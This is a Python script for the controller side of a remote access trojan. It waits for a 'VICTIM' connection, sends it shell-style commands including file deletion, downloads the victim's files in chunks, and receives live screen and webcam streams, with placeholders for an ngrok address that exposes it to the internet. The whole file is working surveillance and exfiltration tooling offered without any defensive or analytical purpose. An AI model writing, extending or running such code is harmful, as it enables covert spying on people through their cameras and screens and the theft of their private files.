import socket
import math
import threading
import time
from vidstream import StreamingServer






IP = "your ngrok link ip or ip or localhost"
PORT = 9099
ENCODE = "utf-8"
SIZE = 1024
path = ""
COMMANDS= ['cd', 'ls', 'mdir', 'rvf', 'rvd', 'rm', 'gsize' ,'cwd']

def download_view(num_of_chunks, chunk_pointer):
    chunk_per = math.ceil((int(chunk_pointer)/int(num_of_chunks )) *100)
    print(f"#{chunk_per * '='}>{(100 - chunk_per) * ' '}#  {chunk_per} /100" , end='\r')
    
def os_commands_processes():
    global path
    data = connection.recv(SIZE)
    data= data.decode(ENCODE)
    if len(data.split('!'))>1:
        if data.split('!')[0] == 'path':
            path = data.split('!')[1]
    print(data)
    connection.sendall("Done".encode(ENCODE))



def download(file_name, multi=False):
    files = connection.recv(SIZE).decode(ENCODE)
    print(f"[+] The number of files are: {files.split(' ')}")
    print(f"[+] The number of files are: {len(files.split(' '))}")
    connection.sendall("Done!".encode(ENCODE)) 
    for file_name in files.split(' '):
        loop_num = connection.recv(SIZE).decode(ENCODE)
        print(f"The chunk number is: {loop_num}")
        with open(f"download/{file_name.split('/')[-1]}", "+ab") as file:
            connection.sendall("Done!".encode(ENCODE)) 
            for i in range(int(loop_num) if loop_num.isdigit() else 0):
                chunk = connection.recv(SIZE)
                file.write(chunk)
                download_view(loop_num, i)
                connection.sendall("Done!".encode(ENCODE)) 
            print() 
def screen_record():
    reciver = StreamingServer('your ngrok link ip or ip or localhost' ,9876)   
    reciver.start_server()
def camera_record():
    reciverCamera = StreamingServer('your ngrok link ip or ip or localhost' ,9909)   
    reciverCamera.start_server()
        
       
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.bind((IP, PORT))
    server.listen() 

    connection, address = server.accept()
    print(f"[+]New VICTIM")

  
    while connection:
        command = input(f"{path}/> ")
        connection.sendall(command.encode(ENCODE))
        command = command.split(' ')
        if command[0] == 'download':
            download(command[1], multi=len(command[1].split('.')) == 1)
        elif command[0].split('\n')[0]in COMMANDS:
            os_commands_processes()
        elif command[0] == 'screen':
            thread= threading.Thread(target=screen_record)
            thread.start()
        elif command[0] == 'camera':
            thread= threading.Thread(target=camera_record)
            thread.start()
        connection.recv(SIZE).decode(ENCODE)